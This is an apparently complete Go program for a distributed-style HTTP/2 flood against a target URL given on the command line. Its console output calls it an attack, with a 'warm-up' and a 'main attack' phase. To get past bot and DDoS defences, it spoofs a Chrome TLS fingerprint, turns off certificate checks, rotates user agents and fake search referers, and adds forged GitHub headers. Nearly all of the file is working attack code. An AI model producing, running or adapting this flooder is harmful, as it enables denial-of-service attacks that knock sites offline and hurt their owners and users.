package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	utls "github.com/refraction-networking/utls"
)

var (
	requestCount uint64
	userAgents   = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/125.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	}

	connectionPool = sync.Pool{
		New: func() interface{} {
			return createHTTP2Client()
		},
	}
)

type AttackConfig struct {
	TargetURL *url.URL
	Threads   int
	Duration  time.Duration
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: go run main.go <target> <threads> <duration>")
		os.Exit(1)
	}

	targetURL, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Printf("Invalid URL: %v\n", err)
		os.Exit(1)
	}

	threads, _ := strconv.Atoi(os.Args[2])
	durationSec, _ := strconv.Atoi(os.Args[3])

	config := &AttackConfig{
		TargetURL: targetURL,
		Threads:   threads,
		Duration:  time.Duration(durationSec) * time.Second,
	}

	rand.Seed(time.Now().UnixNano())

	ctx, cancel := context.WithTimeout(context.Background(), config.Duration)
	defer cancel()

	var wg sync.WaitGroup
	requestCounter := make(chan uint64, 10000)

	go func() {
		var total uint64
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\nTotal requests sent: %d\n", total)
				return
			case count := <-requestCounter:
				total += count
			case <-ticker.C:
				current := atomic.LoadUint64(&requestCount)
				fmt.Printf("\rRequests: %d (RPS: %d)  ", total, current)
				atomic.StoreUint64(&requestCount, 0)
			}
		}
	}()

	fmt.Println("Starting warm-up phase...")
	warmUp(ctx, config)

	fmt.Println("Starting main attack...")
	startTime := time.Now()

	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			attacker(ctx, config, requestCounter)
		}(i)
	}

	wg.Wait()
	close(requestCounter)
	
	duration := time.Since(startTime)
	fmt.Printf("\nAttack completed in %v\n", duration)
}

func warmUp(ctx context.Context, config *AttackConfig) {
	warmupCtx, cancel := context.WithTimeout(ctx, 3*time.Second)
	defer cancel()

	var warmupWg sync.WaitGroup
	for i := 0; i < 3; i++ {
		warmupWg.Add(1)
		go func() {
			defer warmupWg.Done()
			client := createHTTP2Client()
			
			for {
				select {
				case <-warmupCtx.Done():
					return
				default:
					sendRequest(client, config.TargetURL, true)
					time.Sleep(time.Duration(300+rand.Intn(700)) * time.Millisecond)
				}
			}
		}()
	}
	warmupWg.Wait()
}

func attacker(ctx context.Context, config *AttackConfig, counter chan<- uint64) {
	client := connectionPool.Get().(*http.Client)
	defer connectionPool.Put(client)

	batchSize := 10
	requests := make([]bool, 0, batchSize)
	
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 0; i < batchSize; i++ {
				success := sendRequest(client, config.TargetURL, false)
				requests = append(requests, success)
			}
			
			var successCount uint64
			for _, success := range requests {
				if success {
					successCount++
				}
			}
			
			if successCount > 0 {
				atomic.AddUint64(&requestCount, successCount)
				counter <- successCount
			}
			
			requests = requests[:0]
		}
	}
}

func createHTTP2Client() *http.Client {
	tlsConfig := &utls.Config{
		ServerName:         "",
		InsecureSkipVerify: true,
		OmitEmptyPsk:       true,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}

	transport := &http2.Transport{
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			uConn, err := net.DialTimeout(network, addr, 5*time.Second)
			if err != nil {
				return nil, err
			}
			
			host, _, _ := net.SplitHostPort(addr)
			tlsConfig.ServerName = host
			
			uTLSConn := utls.UClient(uConn, tlsConfig, utls.HelloChrome_120)
			if err := uTLSConn.Handshake(); err != nil {
				return nil, err
			}
			
			return uTLSConn, nil
		},
		DisableCompression: false,
		AllowHTTP:          false,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}
}

func sendRequest(client *http.Client, target *url.URL, warmup bool) bool {
	req, err := http.NewRequest("GET", target.String(), nil)
	if err != nil {
		return false
	}

	headers := generateDynamicHeaders(target, warmup)
	for key, values := range headers {
		for _, value := range values {
			req.Header.Add(key, value)
		}
	}

	if rand.Intn(100) > 80 {
		req.Header.Add("X-GitHub-Request-Id", fmt.Sprintf("%x", rand.Uint64()))
		req.Header.Add("X-GitHub-Delivery", fmt.Sprintf("%x", rand.Uint64()))
	}

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode < 400
}

func generateDynamicHeaders(target *url.URL, warmup bool) map[string][]string {
	headers := map[string][]string{
		"User-Agent":                {userAgents[rand.Intn(len(userAgents))]},
		"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"},
		"Accept-Language":           {"en-US,en;q=0.9"},
		"Accept-Encoding":           {"gzip, deflate, br"},
		"Connection":                {"keep-alive"},
		"Upgrade-Insecure-Requests": {"1"},
		"Sec-Fetch-Dest":            {"document"},
		"Sec-Fetch-Mode":            {"navigate"},
		"Sec-Fetch-Site":            {"none"},
		"Sec-Fetch-User":            {"?1"},
		"Cache-Control":             {"max-age=0"},
		"TE":                        {"trailers"},
	}

	if warmup {
		headers["Pragma"] = []string{"no-cache"}
	}

	if rand.Intn(100) > 70 {
		headers["Referer"] = []string{generateRandomReferer(target)}
	}

	return headers
}

func generateRandomReferer(target *url.URL) string {
	referers := []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://search.yahoo.com/",
		"https://duckduckgo.com/",
		"https://github.com/",
	}
	return referers[rand.Intn(len(referers))] + "search?q=" + target.Hostname()
}